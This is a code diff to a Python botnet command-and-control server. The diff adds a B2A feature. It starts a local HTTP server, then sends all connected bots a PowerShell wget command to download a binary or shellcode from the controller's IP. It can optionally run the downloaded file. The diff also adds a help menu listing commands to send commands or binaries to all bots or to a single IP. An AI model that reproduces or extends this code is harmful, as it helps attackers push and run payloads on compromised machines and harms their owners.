@@ -1,3 +1,7 @@
+"""
+# TODO Fix B2A 
+"""
+
 import socket
 import threading
 import os, subprocess
@@ -6,7 +10,8 @@ os.chdir(os.path.abspath('/tmp/'))
 import requests
 
 bots=[]
-
+myip="192.168.1.8"
+httpPort=6080
 port = 6061
 debug = 0
 
@@ -106,7 +111,7 @@ def send_message(bot):
     print("send_message started")
     while True:
         try:
-            message = input("").split("\n")
+            message = input("").split("\n")[0]
             # end shell mode
             if message == "exit shell":
                 break
@@ -115,6 +120,7 @@ def send_message(bot):
                 conn.send(message.encode('utf-8'))
         except:
             # todo - errors
+            print("Error")
             pass
 
 """
@@ -124,6 +130,10 @@ def SR(command,conn,r_buffer):
     conn.send(command.encode('utf-8'))
     return conn.recv(r_buffer)
 
+
+"""
+Send a command to all bots
+"""
 def C2A(command):
     Command = s_input("C2A:~")
     if Command == "exit":
@@ -145,6 +155,60 @@ def C2A(command):
     else:
         return
 
+
+
+
+"""
+LocalLocation is the location on the server
+RLocation is the file name for the bot
+
+"""
+def B2A(LocalLocation,sendANDrun):
+    RLocation = LocalLocation.split("/")[0]
+    # Run an http server
+    # TODO !!!!!!!! FIX this! - It deos not kill the process it just kills the bash process
+    proc1 = execute_command("python -m SimpleHTTPServer "+str(httpPort))
+    # setting up the command
+    command = "powershell.exe wget http://"+myip+":"+str(httpPort)+"/"+LocalLocation+" -o "+RLocation
+    command = command + "\r\n"
+
+    # do this for all bots
+    for bot in bots:
+
+        # Setup all needed parameters
+        addr = bot[1]
+        conn = bot[0]
+        ip = addr[0]
+        port = addr[1]
+
+        # Try to send command
+        try:
+            SR(command,conn,6282)
+
+            if sendANDrun:
+                # To execute
+                command = "./"+RLocation
+                command = command + "\r\n"
+                SR(command,conn,6282)
+            print(str(ip)+" Received")
+        except:
+            if debug:
+                print("Error at one2all(command) when sending to "+str(ip))
+                
+                
+    
+    # TODO!!! Fix it
+    # kill the http server
+    proc1.kill()
+
+"""
+
+"""
+def B2AHandler():
+    LocalLocation = input("File location:").strip("\n")
+    sendANDrun = input("Upload and run?").strip("\n")
+    B2A(LocalLocation,sendANDrun)
+
 """
 Start shell mode
 """
@@ -155,6 +219,7 @@ def talk(bot):
     ip = conn.getpeername()[0]
     port = conn.getpeername()[1]
 
+    # start a new thread to send strings/commands.
     send_message_thread = threading.Thread(target=send_message, args=(bot,))
     send_message_thread.daemon = True
     send_message_thread.start()
@@ -192,6 +257,7 @@ def kill_all():
 
 """
 Find a match
+name = ip
 """
 def find_bot(name):
     for bot in bots:
@@ -200,22 +266,37 @@ def find_bot(name):
             return bot
     return []
 
+def help(type):
+    if type == 0:
+        print("list      List all bots"
+              "C2A       Send a Command 2 All bots"
+              "B2A       Send a Binary/Shellcode 2 All bots"
+              "C2I       Send a Command 2 one IP"
+              "B2I       Send a Binary/Shellcode 2 one IP")
+    pass
+
 def console():
     while 1:
         Command = s_input("MB:~")
         if len(Command) <= 0:
             continue
+        # if command is a valid ip
         bot = find_bot(Command)
+        # if bot exists.
         if len(bot) >= 2:
             talk(bot)
             continue
         elif Command == "list":
             list()
         # Send a command to all bots
+        elif Command == "help":
+            help(0)
+        # Send a command to all bots
         elif Command == "C2A":
             C2A()
         # Send a binary to all bots
         elif Command == "B2A":
+            B2AHandler()
             pass
         elif Command == "C2I":
             pass
